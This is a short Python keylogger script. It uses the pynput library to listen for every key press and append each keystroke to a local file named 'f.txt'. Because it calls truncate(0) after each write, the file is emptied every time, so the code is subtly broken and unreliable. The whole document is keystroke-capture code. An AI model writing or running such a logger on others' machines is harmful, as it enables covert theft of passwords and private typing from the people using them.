from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    with open('f.txt', 'a') as f:
        f.write(letter)
        f.truncate(0)


with Listener(on_press=write_to_file) as l1:
    l1.join()
